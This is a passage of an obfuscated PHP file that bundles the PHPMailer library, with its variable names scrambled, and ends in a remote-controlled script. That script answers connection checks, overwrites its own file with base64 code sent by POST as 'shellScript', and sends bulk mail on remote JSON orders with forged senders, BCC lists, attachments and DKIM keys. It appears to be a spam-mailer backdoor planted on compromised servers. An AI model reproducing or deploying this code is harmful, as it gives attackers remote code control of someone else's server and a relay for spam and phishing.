(!static::isValidHost($spd1b056)) { return 'localhost.localdomain'; } return $spd1b056; } public static function isValidHost($spbb8891) { if (empty($spbb8891) || !is_string($spbb8891) || strlen($spbb8891) > 256 || !preg_match('/^([a-zA-Z\\d.-]*|\\[[a-fA-F\\d:]+])$/', $spbb8891)) { return false; } if (strlen($spbb8891) > 2 && substr($spbb8891, 0, 1) === '[' && substr($spbb8891, -1, 1) === ']') { return filter_var(substr($spbb8891, 1, -1), FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) !== false; } if (is_numeric(str_replace('.', '', $spbb8891))) { return filter_var($spbb8891, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) !== false; } if (filter_var('http://' . $spbb8891, FILTER_VALIDATE_URL) !== false) { return true; } return false; } protected function lang($sp936048) { if (count($this->language) < 1) { $this->setLanguage(); } if (array_key_exists($sp936048, $this->language)) { if ('smtp_connect_failed' === $sp936048) { return $this->language[$sp936048] . ' https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting'; } return $this->language[$sp936048]; } return $sp936048; } public function isError() { return $this->error_count > 0; } public function addCustomHeader($spea80ec, $spd05110 = null) { if (null === $spd05110 && strpos($spea80ec, ':') !== false) { list($spea80ec, $spd05110) = explode(':', $spea80ec, 2); } $spea80ec = trim($spea80ec); $spd05110 = trim($spd05110); if (empty($spea80ec) || strpbrk($spea80ec . $spd05110, '
') !== false) { if ($this->exceptions) { throw new Exception('Invalid header name or value'); } return false; } $this->CustomHeader[] = array($spea80ec, $spd05110); return true; } public function getCustomHeaders() { return $this->CustomHeader; } public function msgHTML($spcc4379, $sp654258 = '', $sp497ef5 = false) { preg_match_all('/(?<!-)(src|background)=["\'](.*)["\']/Ui', $spcc4379, $sp591aeb); if (array_key_exists(2, $sp591aeb)) { if (strlen($sp654258) > 1 && '/' !== substr($sp654258, -1)) { $sp654258 .= '/'; } foreach ($sp591aeb[2] as $spf70715 => $spdf3f5b) { $sp5bb2a1 = array(); if (preg_match('#^data:(image/(?:jpe?g|gif|png));?(base64)?,(.+)#', $spdf3f5b, $sp5bb2a1)) { if (count($sp5bb2a1) === 4 && static::ENCODING_BASE64 === $sp5bb2a1[2]) { $spa2d1f8 = base64_decode($sp5bb2a1[3]); } elseif ('' === $sp5bb2a1[2]) { $spa2d1f8 = rawurldecode($sp5bb2a1[3]); } else { continue; } $spb12ced = substr(hash('sha256', $spa2d1f8), 0, 32) . '@phpmailer.0'; if (!$this->cidExists($spb12ced)) { $this->addStringEmbeddedImage($spa2d1f8, $spb12ced, 'embed' . $spf70715, static::ENCODING_BASE64, $sp5bb2a1[1]); } $spcc4379 = str_replace($sp591aeb[0][$spf70715], $sp591aeb[1][$spf70715] . '="cid:' . $spb12ced . '"', $spcc4379); continue; } if (!empty($sp654258) && strpos($spdf3f5b, '..') === false && 0 !== strpos($spdf3f5b, 'cid:') && !preg_match('#^[a-z][a-z0-9+.-]*:?//#i', $spdf3f5b)) { $sp963928 = static::mb_pathinfo($spdf3f5b, PATHINFO_BASENAME); $sp97fd90 = dirname($spdf3f5b); if ('.' === $sp97fd90) { $sp97fd90 = ''; } $spb12ced = substr(hash('sha256', $spdf3f5b), 0, 32) . '@phpmailer.0'; if (strlen($sp654258) > 1 && '/' !== substr($sp654258, -1)) { $sp654258 .= '/'; } if (strlen($sp97fd90) > 1 && '/' !== substr($sp97fd90, -1)) { $sp97fd90 .= '/'; } if ($this->addEmbeddedImage($sp654258 . $sp97fd90 . $sp963928, $spb12ced, $sp963928, static::ENCODING_BASE64, static::_mime_types((string) static::mb_pathinfo($sp963928, PATHINFO_EXTENSION)))) { $spcc4379 = preg_replace('/' . $sp591aeb[1][$spf70715] . '=["\']' . preg_quote($spdf3f5b, '/') . '["\']/Ui', $sp591aeb[1][$spf70715] . '="cid:' . $spb12ced . '"', $spcc4379); } } } } $this->isHTML(); $this->Body = static::normalizeBreaks($spcc4379); $this->AltBody = static::normalizeBreaks($this->html2text($spcc4379, $sp497ef5)); if (!$this->alternativeExists()) { $this->AltBody = 'This is an HTML-only message. To view it, activate HTML in your email application.' . static::$LE; } return $this->Body; } public function html2text($sp5d14b5, $sp497ef5 = false) { if (is_callable($sp497ef5)) { return $sp497ef5($sp5d14b5); } return html_entity_decode(trim(strip_tags(preg_replace('/<(head|title|style|script)[^>]*>.*?<\\/\\1>/si', '', $sp5d14b5))), ENT_QUOTES, $this->CharSet); } public static function _mime_types($sp6806cd = '') { $sp6eea6f = array('xl' => 'application/excel', 'js' => 'application/javascript', 'hqx' => 'application/mac-binhex40', 'cpt' => 'application/mac-compactpro', 'bin' => 'application/macbinary', 'doc' => 'application/msword', 'word' => 'application/msword', 'xlsx' => 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'xltx' => 'application/vnd.openxmlformats-officedocument.spreadsheetml.template', 'potx' => 'application/vnd.openxmlformats-officedocument.presentationml.template', 'ppsx' => 'application/vnd.openxmlformats-officedocument.presentationml.slideshow', 'pptx' => 'application/vnd.openxmlformats-officedocument.presentationml.presentation', 'sldx' => 'application/vnd.openxmlformats-officedocument.presentationml.slide', 'docx' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'dotx' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.template', 'xlam' => 'application/vnd.ms-excel.addin.macroEnabled.12', 'xlsb' => 'application/vnd.ms-excel.sheet.binary.macroEnabled.12', 'class' => 'application/octet-stream', 'dll' => 'application/octet-stream', 'dms' => 'application/octet-stream', 'exe' => 'application/octet-stream', 'lha' => 'application/octet-stream', 'lzh' => 'application/octet-stream', 'psd' => 'application/octet-stream', 'sea' => 'application/octet-stream', 'so' => 'application/octet-stream', 'oda' => 'application/oda', 'pdf' => 'application/pdf', 'ai' => 'application/postscript', 'eps' => 'application/postscript', 'ps' => 'application/postscript', 'smi' => 'application/smil', 'smil' => 'application/smil', 'mif' => 'application/vnd.mif', 'xls' => 'application/vnd.ms-excel', 'ppt' => 'application/vnd.ms-powerpoint', 'wbxml' => 'application/vnd.wap.wbxml', 'wmlc' => 'application/vnd.wap.wmlc', 'dcr' => 'application/x-director', 'dir' => 'application/x-director', 'dxr' => 'application/x-director', 'dvi' => 'application/x-dvi', 'gtar' => 'application/x-gtar', 'php3' => 'application/x-httpd-php', 'php4' => 'application/x-httpd-php', 'php' => 'application/x-httpd-php', 'phtml' => 'application/x-httpd-php', 'phps' => 'application/x-httpd-php-source', 'swf' => 'application/x-shockwave-flash', 'sit' => 'application/x-stuffit', 'tar' => 'application/x-tar', 'tgz' => 'application/x-tar', 'xht' => 'application/xhtml+xml', 'xhtml' => 'application/xhtml+xml', 'zip' => 'application/zip', 'mid' => 'audio/midi', 'midi' => 'audio/midi', 'mp2' => 'audio/mpeg', 'mp3' => 'audio/mpeg', 'm4a' => 'audio/mp4', 'mpga' => 'audio/mpeg', 'aif' => 'audio/x-aiff', 'aifc' => 'audio/x-aiff', 'aiff' => 'audio/x-aiff', 'ram' => 'audio/x-pn-realaudio', 'rm' => 'audio/x-pn-realaudio', 'rpm' => 'audio/x-pn-realaudio-plugin', 'ra' => 'audio/x-realaudio', 'wav' => 'audio/x-wav', 'mka' => 'audio/x-matroska', 'bmp' => 'image/bmp', 'gif' => 'image/gif', 'jpeg' => 'image/jpeg', 'jpe' => 'image/jpeg', 'jpg' => 'image/jpeg', 'png' => 'image/png', 'tiff' => 'image/tiff', 'tif' => 'image/tiff', 'webp' => 'image/webp', 'heif' => 'image/heif', 'heifs' => 'image/heif-sequence', 'heic' => 'image/heic', 'heics' => 'image/heic-sequence', 'eml' => 'message/rfc822', 'css' => 'text/css', 'html' => 'text/html', 'htm' => 'text/html', 'shtml' => 'text/html', 'log' => 'text/plain', 'text' => 'text/plain', 'txt' => 'text/plain', 'rtx' => 'text/richtext', 'rtf' => 'text/rtf', 'vcf' => 'text/vcard', 'vcard' => 'text/vcard', 'ics' => 'text/calendar', 'xml' => 'text/xml', 'xsl' => 'text/xml', 'wmv' => 'video/x-ms-wmv', 'mpeg' => 'video/mpeg', 'mpe' => 'video/mpeg', 'mpg' => 'video/mpeg', 'mp4' => 'video/mp4', 'm4v' => 'video/mp4', 'mov' => 'video/quicktime', 'qt' => 'video/quicktime', 'rv' => 'video/vnd.rn-realvideo', 'avi' => 'video/x-msvideo', 'movie' => 'video/x-sgi-movie', 'webm' => 'video/webm', 'mkv' => 'video/x-matroska'); $sp6806cd = strtolower($sp6806cd); if (array_key_exists($sp6806cd, $sp6eea6f)) { return $sp6eea6f[$sp6806cd]; } return 'application/octet-stream'; } public static function filenameToType($sp963928) { $sp773ff6 = strpos($sp963928, '?'); if (false !== $sp773ff6) { $sp963928 = substr($sp963928, 0, $sp773ff6); } $sp6806cd = static::mb_pathinfo($sp963928, PATHINFO_EXTENSION); return static::_mime_types($sp6806cd); } public static function mb_pathinfo($sp2cedb8, $specf720 = null) { $spc9bf51 = array('dirname' => '', 'basename' => '', 'extension' => '', 'filename' => ''); $sp84f561 = array(); if (preg_match('#^(.*?)[\\\\/]*(([^/\\\\]*?)(\\.([^.\\\\/]+?)|))[\\\\/.]*$#m', $sp2cedb8, $sp84f561)) { if (array_key_exists(1, $sp84f561)) { $spc9bf51['dirname'] = $sp84f561[1]; } if (array_key_exists(2, $sp84f561)) { $spc9bf51['basename'] = $sp84f561[2]; } if (array_key_exists(5, $sp84f561)) { $spc9bf51['extension'] = $sp84f561[5]; } if (array_key_exists(3, $sp84f561)) { $spc9bf51['filename'] = $sp84f561[3]; } } switch ($specf720) { case PATHINFO_DIRNAME: case 'dirname': return $spc9bf51['dirname']; case PATHINFO_BASENAME: case 'basename': return $spc9bf51['basename']; case PATHINFO_EXTENSION: case 'extension': return $spc9bf51['extension']; case PATHINFO_FILENAME: case 'filename': return $spc9bf51['filename']; default: return $spc9bf51; } } public function set($spea80ec, $spd05110 = '') { if (property_exists($this, $spea80ec)) { $this->{$spea80ec} = $spd05110; return true; } $this->setError($this->lang('variable_set') . $spea80ec); return false; } public function secureHeader($spd82e5e) { return trim(str_replace(array('
', '
'), '', $spd82e5e)); } public static function normalizeBreaks($spd161a8, $spf44304 = null) { if (null === $spf44304) { $spf44304 = static::$LE; } $spd161a8 = str_replace(array(self::CRLF, '
'), '
', $spd161a8); if ('
' !== $spf44304) { $spd161a8 = str_replace('
', $spf44304, $spd161a8); } return $spd161a8; } public static function stripTrailingWSP($spd161a8) { return rtrim($spd161a8, ' 
	'); } public static function getLE() { return static::$LE; } protected static function setLE($sp47a574) { static::$LE = $sp47a574; } public function sign($spa8d57d, $sp7a5ae8, $sp02edd4, $spf5a4d6 = '') { $this->sign_cert_file = $spa8d57d; $this->sign_key_file = $sp7a5ae8; $this->sign_key_pass = $sp02edd4; $this->sign_extracerts_file = $spf5a4d6; } public function DKIM_QP($spdabcdb) { $sp61efeb = ''; $spca0243 = strlen($spdabcdb); for ($spe144a6 = 0; $spe144a6 < $spca0243; ++$spe144a6) { $sp48e370 = ord($spdabcdb[$spe144a6]); if (33 <= $sp48e370 && $sp48e370 <= 58 || $sp48e370 === 60 || 62 <= $sp48e370 && $sp48e370 <= 126) { $sp61efeb .= $spdabcdb[$spe144a6]; } else { $sp61efeb .= '=' . sprintf('%02X', $sp48e370); } } return $sp61efeb; } public function DKIM_Sign($sp56c63d) { if (!defined('PKCS7_TEXT')) { if ($this->exceptions) { throw new Exception($this->lang('extension_missing') . 'openssl'); } return ''; } $spd0afd1 = !empty($this->DKIM_private_string) ? $this->DKIM_private_string : file_get_contents($this->DKIM_private); if ('' !== $this->DKIM_passphrase) { $sp0bae69 = openssl_pkey_get_private($spd0afd1, $this->DKIM_passphrase); } else { $sp0bae69 = openssl_pkey_get_private($spd0afd1); } if (openssl_sign($sp56c63d, $sp3bb74f, $sp0bae69, 'sha256WithRSAEncryption')) { openssl_pkey_free($sp0bae69); return base64_encode($sp3bb74f); } openssl_pkey_free($sp0bae69); return ''; } public function DKIM_HeaderC($sp56c63d) { $sp56c63d = static::normalizeBreaks($sp56c63d, self::CRLF); $sp56c63d = preg_replace('/\\r\\n[ \\t]+/', ' ', $sp56c63d); $sp6e5c3d = explode(self::CRLF, $sp56c63d); foreach ($sp6e5c3d as $sp936048 => $sp61efeb) { if (strpos($sp61efeb, ':') === false) { continue; } list($spde3057, $spd05110) = explode(':', $sp61efeb, 2); $spde3057 = strtolower($spde3057); $spd05110 = preg_replace('/[ \\t]+/', ' ', $spd05110); $sp6e5c3d[$sp936048] = trim($spde3057, ' 	') . ':' . trim($spd05110, ' 	'); } return implode(self::CRLF, $sp6e5c3d); } public function DKIM_BodyC($spb9ada7) { if (empty($spb9ada7)) { return self::CRLF; } $spb9ada7 = static::normalizeBreaks($spb9ada7, self::CRLF); return static::stripTrailingWSP($spb9ada7) . self::CRLF; } public function DKIM_Add($spec84cd, $spc7b87c, $spb9ada7) { $sp52d15a = 'rsa-sha256'; $sp891d56 = 'relaxed/simple'; $sp311f8a = 'dns/txt'; $sp56bf17 = time(); $spbe5a60 = array('from', 'to', 'cc', 'date', 'subject', 'reply-to', 'message-id', 'content-type', 'mime-version', 'x-mailer'); if (stripos($spec84cd, 'Subject') === false) { $spec84cd .= 'Subject: ' . $spc7b87c . static::$LE; } $spe464b9 = explode(static::$LE, $spec84cd); $sp711041 = ''; $sp68dfd4 = ''; $sp5fe3a9 = array(); $sp2a333c = 0; $sp32bafe = count($spe464b9); foreach ($spe464b9 as $sp1bc431) { $sp979d0c = array(); if (preg_match('/^([^ \\t]*?)(?::[ \\t]*)(.*)$/', $sp1bc431, $sp979d0c)) { if ($sp711041 !== '') { $sp5fe3a9[] = array('label' => $sp711041, 'value' => $sp68dfd4); } $sp711041 = $sp979d0c[1]; $sp68dfd4 = $sp979d0c[2]; } elseif (preg_match('/^[ \\t]+(.*)$/', $sp1bc431, $sp979d0c)) { $sp68dfd4 .= ' ' . $sp979d0c[1]; } ++$sp2a333c; if ($sp2a333c >= $sp32bafe) { $sp5fe3a9[] = array('label' => $sp711041, 'value' => $sp68dfd4); } } $sp1a93c7 = array(); $sp398378 = array(); $sp48116d = array(); foreach ($sp5fe3a9 as $sp3481c3) { if (in_array(strtolower($sp3481c3['label']), $spbe5a60, true)) { $sp398378[] = $sp3481c3['label']; $sp48116d[] = $sp3481c3['label'] . ': ' . $sp3481c3['value']; if ($this->DKIM_copyHeaderFields) { $sp1a93c7[] = $sp3481c3['label'] . ':' . str_replace('|', '=7C', $this->DKIM_QP($sp3481c3['value'])); } continue; } if (in_array($sp3481c3['label'], $this->DKIM_extraHeaders, true)) { foreach ($this->CustomHeader as $spdc3f7b) { if ($spdc3f7b[0] === $sp3481c3['label']) { $sp398378[] = $sp3481c3['label']; $sp48116d[] = $sp3481c3['label'] . ': ' . $sp3481c3['value']; if ($this->DKIM_copyHeaderFields) { $sp1a93c7[] = $sp3481c3['label'] . ':' . str_replace('|', '=7C', $this->DKIM_QP($sp3481c3['value'])); } continue 2; } } } } $sp7dc429 = ''; if ($this->DKIM_copyHeaderFields && count($sp1a93c7) > 0) { $sp7dc429 = ' z='; $spe3e647 = true; foreach ($sp1a93c7 as $sp377fd0) { if (!$spe3e647) { $sp7dc429 .= static::$LE . ' |'; } if (strlen($sp377fd0) > self::STD_LINE_LENGTH - 3) { $sp7dc429 .= substr(chunk_split($sp377fd0, self::STD_LINE_LENGTH - 3, static::$LE . self::FWS), 0, -strlen(static::$LE . self::FWS)); } else { $sp7dc429 .= $sp377fd0; } $spe3e647 = false; } $sp7dc429 .= ';' . static::$LE; } $sp87c294 = ' h=' . implode(':', $sp398378) . ';' . static::$LE; $sp62d0ca = implode(static::$LE, $sp48116d); $spb9ada7 = $this->DKIM_BodyC($spb9ada7); $sp841fb3 = base64_encode(pack('H*', hash('sha256', $spb9ada7))); $spb0876d = ''; if ('' !== $this->DKIM_identity) { $spb0876d = ' i=' . $this->DKIM_identity . ';' . static::$LE; } $spd073ad = 'DKIM-Signature: v=1;' . ' d=' . $this->DKIM_domain . ';' . ' s=' . $this->DKIM_selector . ';' . static::$LE . ' a=' . $sp52d15a . ';' . ' q=' . $sp311f8a . ';' . ' t=' . $sp56bf17 . ';' . ' c=' . $sp891d56 . ';' . static::$LE . $sp87c294 . $spb0876d . $sp7dc429 . ' bh=' . $sp841fb3 . ';' . static::$LE . ' b='; $sp5864ea = $this->DKIM_HeaderC($sp62d0ca . static::$LE . $spd073ad); $sp3bb74f = $this->DKIM_Sign($sp5864ea); $sp3bb74f = trim(chunk_split($sp3bb74f, self::STD_LINE_LENGTH - 3, static::$LE . self::FWS)); return static::normalizeBreaks($spd073ad . $sp3bb74f); } public static function hasLineLongerThanMax($spd82e5e) { return (bool) preg_match('/^(.{' . (self::MAX_LINE_LENGTH + strlen(static::$LE)) . ',})/m', $spd82e5e); } public static function quotedString($spd82e5e) { if (preg_match('/[ ()<>@,;:"\\/\\[\\]?=]/', $spd82e5e)) { return '"' . str_replace('"', '\\"', $spd82e5e) . '"'; } return $spd82e5e; } public function getToAddresses() { return $this->to; } public function getCcAddresses() { return $this->cc; } public function getBccAddresses() { return $this->bcc; } public function getReplyToAddresses() { return $this->ReplyTo; } public function getAllRecipientAddresses() { return $this->all_recipients; } protected function doCallback($spf055bd, $sp9c9f9c, $sp70b7d8, $spf45e8e, $spc7b87c, $spb9ada7, $sp85e450, $spc34866) { if (!empty($this->action_function) && is_callable($this->action_function)) { call_user_func($this->action_function, $spf055bd, $sp9c9f9c, $sp70b7d8, $spf45e8e, $spc7b87c, $spb9ada7, $sp85e450, $spc34866); } } public function getOAuth() { return $this->oauth; } public function setOAuth(OAuth $sp69cc63) { $this->oauth = $sp69cc63; } } function sendResponse($spd1b056, $spea4909) { echo json_encode(array('result' => $spd1b056, 'content' => $spea4909, 'phpVersion' => phpversion(), 'mailFunction' => function_exists('mail'), 'scriptVersion' => '1.2')); die; } if (isset($_POST['checkConnection'])) { sendResponse(true, ''); } else { if (isset($_POST['updateScript'])) { $sp1a41fb = base64_decode($_POST['shellScript']); if (@file_put_contents(__FILE__, $sp1a41fb)) { sendResponse(true, ''); } sendResponse(false, 'error when updating script'); } else { if (isset($_POST['sendMail'])) { $sp232182 = $_POST['mail']; $sp98f1e8 = base64_decode($sp232182); $spd79187 = json_decode($sp98f1e8); if (!$spd79187) { sendResponse(false, 'bad json request, request was: ' . $sp232182); } $spb1f028 = new PHPMailer(); $spb1f028->CharSet = 'UTF-8'; $spb1f028->Encoding = 'base64'; if ($spd79187->DkimDomain) { $spb1f028->DKIM_domain = $spd79187->DkimDomain; $spb1f028->DKIM_private_string = $spd79187->DkimPrivateKey; $spb1f028->DKIM_selector = $spd79187->DkimSelector; $spb1f028->DKIM_passphrase = ''; $spb1f028->DKIM_identity = $spd79187->SenderEmail; } $spb1f028->isMail(); try { $spb1f028->setFrom($spd79187->SenderEmail, $spd79187->SenderName); } catch (\Exception $spb1dfb4) { sendResponse(false, $spb1dfb4->getMessage()); } try { foreach ($spd79187->Addresses as $sp7810fb) { if ($spd79187->SendMethod == 1) { $spb1f028->addAddress($sp7810fb); } else { if ($spd79187->SendMethod == 2) { $spb1f028->addCC($sp7810fb); } else { $spb1f028->addBCC($sp7810fb); } } } } catch (\Exception $spb1dfb4) { sendResponse(false, $spb1dfb4->getMessage()); } $spb1f028->Subject = $spd79187->Subject; foreach ($spd79187->Headers as $sp3481c3) { try { $spb1f028->addCustomHeader($sp3481c3->Key, $sp3481c3->Value); } catch (\Exception $spb1dfb4) { sendResponse(false, $spb1dfb4->getMessage()); } } try { $spb9ada7 = $spd79187->Body; $spb1f028->msgHTML($spb9ada7); } catch (\Exception $spb1dfb4) { sendResponse(false, $spb1dfb4->getMessage()); } foreach ($spd79187->Attachments as $sp0b8fb4) { try { $spee3375 = base64_decode($sp0b8fb4->Content); $spb1f028->addStringAttachment($spee3375, $sp0b8fb4->Filename); } catch (\Exception $spb1dfb4) { sendResponse(false, $spb1dfb4->getMessage()); } } foreach ($spd79187->EmbeddedAttachments as $sp0b8fb4) { try { $spee3375 = base64_decode($sp0b8fb4->Content); $spb1f028->addStringEmbeddedImage($spee3375, $sp0b8fb4->ContentId, $sp0b8fb4->Filename); } catch (\Exception $spb1dfb4) { sendResponse(false, $spb1dfb4->getMessage()); } } try { if (!$spb1f028->send()) { sendResponse(false, $spb1f028->ErrorInfo); } } catch (\Exception $spb1dfb4) { sendResponse(false, $spb1dfb4->getMessage()); } sendResponse(true, ''); } } } ?>

MAIL FUNCTION = <?php  echo function_exists('mail') ? 'YES' : 'NO'; ?>
; PHP VERSION: <?php  echo phpversion();

